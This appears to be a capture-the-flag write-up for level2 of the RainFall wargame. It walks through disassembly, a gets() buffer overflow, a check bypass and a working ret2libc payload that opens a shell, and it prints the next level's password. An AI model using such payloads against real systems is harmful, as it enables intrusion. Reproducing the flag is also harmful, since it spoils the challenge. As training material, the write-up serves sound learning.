# Level2

Once again, we get an executable that freezes when we launch it

We’re going to do the same thing as in level1 :

```nasm
  [...]	
  54: 080484d4   107 FUNC    GLOBAL DEFAULT   13 p
	[...]
  69: 0804853f    13 FUNC    GLOBAL DEFAULT   13 main
  [...]
```

```nasm
Dump of assembler code for function main:
   0x0804853f <+0>:     push   ebp
   0x08048540 <+1>:     mov    ebp,esp
   0x08048542 <+3>:     and    esp,0xfffffff0
   0x08048545 <+6>:     call   0x80484d4 <p>                    // Calls the function p
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   ebp
   0x080484d5 <+1>:     mov    ebp,esp
   0x080484d7 <+3>:     sub    esp,0x68                         // Allocate 0x68 (104) bytes on the stack
   0x080484da <+6>:     mov    eax,ds:0x8049860                 // Move into eax some string
   0x080484df <+11>:    mov    DWORD PTR [esp],eax              // Make sure it is a size 32 ptr and put it on the stack
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>           // Call fflush on it (usually a stream like stdin)
   0x080484e7 <+19>:    lea    eax,[ebp-0x4c]                   // Load into eax whatever is at ebp-0x4c
   0x080484ea <+22>:    mov    DWORD PTR [esp],eax              // Make sure it is a size 32 ptr and put it on the stack
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>             // A call to gets
   0x080484f2 <+30>:    mov    eax,DWORD PTR [ebp+0x4]          // Move into eax whatever is at ebp+0x4
   0x080484f5 <+33>:    mov    DWORD PTR [ebp-0xc],eax          // And move it back into ebp-0xc
   0x080484f8 <+36>:    mov    eax,DWORD PTR [ebp-0xc]          // And copy it into eax again (? not sure what's the point)
   0x080484fb <+39>:    and    eax,0xb0000000                   // Perform and on it
   0x08048500 <+44>:    cmp    eax,0xb0000000                   // And compare it to 0xb0000000 (2952790016)
   0x08048505 <+49>:    jne    0x8048527 <p+83>                 // If it is not equal go to -------------------------------------------
   0x08048507 <+51>:    mov    eax,0x8048620                    // Put some data into eax                                             |
   0x0804850c <+56>:    mov    edx,DWORD PTR [ebp-0xc]          // Put into edx whatever is at ebp-0xc                                |
   0x0804850f <+59>:    mov    DWORD PTR [esp+0x4],edx          // Put that back into esp+0x4                                         |
   0x08048513 <+63>:    mov    DWORD PTR [esp],eax              // Copy the top of the stack into eax                                 |
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>           // Call printf                                                        |
   0x0804851b <+71>:    mov    DWORD PTR [esp],0x1              // Put 1 on top of the stack                                          |
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>            // Call exit with 1                                                   |
   0x08048527 <+83>:    lea    eax,[ebp-0x4c]                   // Put into eax whatever is at ebp-0x4c               <----------------
   0x0804852a <+86>:    mov    DWORD PTR [esp],eax              // Copy eax on top of the stack
	 0x0804852d <+89>:    call   0x80483f0 <puts@plt>             // Call puts
   0x08048532 <+94>:    lea    eax,[ebp-0x4c]                   // Put into eax whatever is at esp-0x4c again
   0x08048535 <+97>:    mov    DWORD PTR [esp],eax              // Move eax on top of the stack
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>           // Call strdup on it 
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
End of assembler dump.
```

We immediately notice there is another call to `gets` so another vulnerability here, but there is no direct call to `system` or something that could give us a shell like in the previous level.

Maybe `printf` prints the password ? But it could also be `strdup`, we’re gonna have to try different scenarios !

```c
int main(int argc, char *argv[]);
__size32 p(char param1);

/** address: 0x0804853f */
int main(int argc, char *argv[])
{
    __size32 eax; 		// r24
    char local0; 		// m[esp - 88]

    eax = p(local0);
    return eax;
}

/** address: 0x080484d4 */
__size32 p(char param1)
{
    char *eax; 		// r24
    FILE *eax_3; 		// r24{4}
    union { int; void *; } local0; 		// m[esp]

    eax_3 = *0x8049860;
    fflush(eax_3);
    gets(&param1);
    if ((local0 & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", local0);
        _exit(1);
    }
    puts(&param1);
    eax = strdup(&param1);
    return eax;
}
```

In hacking, a shellcode is **a small piece of executable code used as the payload in the exploitation of a software vulnerability**.

Just like in level1, we’ll try to create a payload to overwrite `ebp+0x4` (The value that is compared with `0xb0000000` and that triggers the `printf` call).

Let’s calculate how large our payload should be :

```nasm
   0x080484e7 <+19>:    lea    eax,[ebp-0x4c]                   // Load into eax whatever is at ebp-0x4c
   0x080484ea <+22>:    mov    DWORD PTR [esp],eax              // Make sure it is a size 32 ptr and put it on the stack
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>             // A call to gets
   0x080484f2 <+30>:    mov    eax,DWORD PTR [ebp+0x4]          // Move into eax whatever is at ebp+0x4
```

So we’re loading from `ebp-0x4c` (76) and we’re reading at `ebp+0x4` (4). Then the actual thing we’re comparing is 4 too so that makes 76 + 4 + 4 = 84

We can use an address like `0xbffffff` since `and` will be performed on it to check for a `0xb` start, the end of the address is irrelevant.

```nasm
level2@RainFall:~$ python -c 'print "A" * 80 + "\xff\xff\xff\xbf"' | ./level2
(0xbfffffff)
```

It just prints the address we gave it back, let’s analyze what happened

```nasm
   0x08048507 <+51>:    mov    eax,0x8048620                    // Put some data into eax                                             
   0x0804850c <+56>:    mov    edx,DWORD PTR [ebp-0xc]          // Put into edx whatever is at ebp-0xc                                
   0x0804850f <+59>:    mov    DWORD PTR [esp+0x4],edx          // Put that back into esp+0x4                                        
   0x08048513 <+63>:    mov    DWORD PTR [esp],eax              // Copy the top of the stack into eax                                 
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>           // Call printf  
```

Let’s see what at `0x8048620` :

```nasm
level2@RainFall:~$ gdb -q ./level2
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) x/s 0x8048620
0x8048620:       "(%p)\n"
```

That’s what’s happening, we’re getting the output inside parenthesizes. 

But that isn’t really helpful, let’s try to avoid the check and go to the other part of the program :

```nasm
   0x08048527 <+83>:    lea    eax,[ebp-0x4c]                   // Put into eax whatever is at ebp-0x4c
   0x0804852a <+86>:    mov    DWORD PTR [esp],eax              // Copy eax on top of the stack
	 0x0804852d <+89>:    call   0x80483f0 <puts@plt>             // Call puts
   0x08048532 <+94>:    lea    eax,[ebp-0x4c]                   // Put into eax whatever is at esp-0x4c again
   0x08048535 <+97>:    mov    DWORD PTR [esp],eax              // Move eax on top of the stack
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>           // Call strdup on it 
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
```

Let’s use another address that doesn’t start with 0xb then :

```nasm
level2@RainFall:~$ python -c 'print "A" * 80 + "\x40\x85\x04\x08"' | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@AAAAAAAAAAAA@
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAAAAAA`J
Segmentation fault (core dumped)
```

It printed some of the ‘A’ we provided and some other memory, but it’s not enough yet.

Here i provided a random address ( this line in main : `0x08048540 <+1>:     mov    ebp,esp` ) but if the address is relevant, this line could indeed create a segfault.

Let’s try pointing to this line instead :  `0x08048516 <+66>:    call   0x80483a0 [printf@plt]          // Call printf` and hope it executes printf and then exits with 1

```nasm
level2@RainFall:~$ python -c 'print "A" * 80 + "\x16\x85\x04\x08"' | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
level2@RainFall:~$ echo $?
1
```

We can’t see any `printf` output but we did indeed exit with 1, so it seems that we’re still going through that part of the program by modifying the address in our payload : 

```nasm
0x08048516 <+66>:    call   0x80483a0 <printf@plt>           // Call printf                                                        
0x0804851b <+71>:    mov    DWORD PTR [esp],0x1              // Put 1 on top of the stack                                          
0x08048522 <+78>:    call   0x80483d0 <_exit@plt>            // Call exit with 1
```

Let’s recap what we know so far :

- Gets is vulnerable again and we can use a payload to bypass the check
- There is no way to get a shell or a password directly from the program
- We can add an address to our payload and it will execute code from there

Knowing that, what we want to do is find a way to get a shell or the password directly. In level1 there was a call to system, it isn’t present in the code here but maybe we can still find it’s address in libc ? 

After some research we learn that `gdb` can do that !

```nasm
level2@RainFall:~$ gdb -q ./level2
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x8048542
(gdb) run
Starting program: /home/user/level2/level2

Breakpoint 1, 0x08048542 in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

It seems to be at `0xb7e6b060` . But that won’t bypass the check since it starts with `0xb` ..

```nasm
level2@RainFall:~$ python -c 'print "A" * 80 + "\x60\xb0\xe6\xb7"' | ./level2
(0xb7e6b060)
```

Maybe there is a way to move the address of system ? Or to link to it with another address ? Or maybe that’s not the right way to solve it at all

No idea :/ 

We can try using the ret2libc attack explained in this article https://shellblade.net/files/docs/ret2libc.pdf

We will inject in the stack the code system(”/bin/bash”); exit();

The exit() call is needed to cleany end our program.

```bash
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

Moreover, there is a check if the return address has been modified with something starting with 0xb… If we return to a random line of the program we have great chances to encounter a segfault. So we can simply put the ret instructions’ address.

```bash
(gdb) disas p
Dump of assembler code for function p:
   [...]
   0x0804853e <+106>:	ret    
End of assembler dump.
```

We should take in consideration the order of the stack (we don’t do exactly like the schema above) :

1. return address
2. system()
3. exit()
4. arg of system

The last thing is to get to address of “/bin/sh” (not working with “/bin/bash”) that is the env variable SHELL :

```bash
level2@RainFall:~$ export SHELL=/bin/sh
level2@RainFall:~$ echo '#include <stdio.h>
> #include <stdlib.h>
> 
> int main(int ac, char *argv[]) {
> printf("%p\n", getenv(argv[1])); }' > /tmp/script.c
level2@RainFall:~$ cd /tmp
level2@RainFall:/tmp$ gcc script.c -o script
level2@RainFall:/tmp$ ./script SHELL
0xbffff8bf
level2@RainFall:tmp$ cd -
/home/user/level2
```

```bash
level2@RainFall:~$ python -c 'print("A" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\xbf\xf8\xff\xbf")' > /tmp/payload
level2@RainFall:~$ cat /tmp/payload - | ./level2 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`����巿���
sh: 1: in/sh: Permission denied
```

Trying with the address given by getenv(), it is not working and it seems that it used the string “in/sh” instead of “/bin/sh”. So we will try to step back from 2 bytes to have the complete string :

```bash
level2@RainFall:~$ python -c 'print("A" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\xbd\xf8\xff\xbf")' > /tmp/payload
level2@RainFall:~$ cat /tmp/payload - | ./level2 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`����巽���
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

OMG DONE !!!

```bash
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

**492deb0e 7d14c4b5 695173cc a843c438 4fe52d08 57c2b071 8e1a521a 4d33ec02**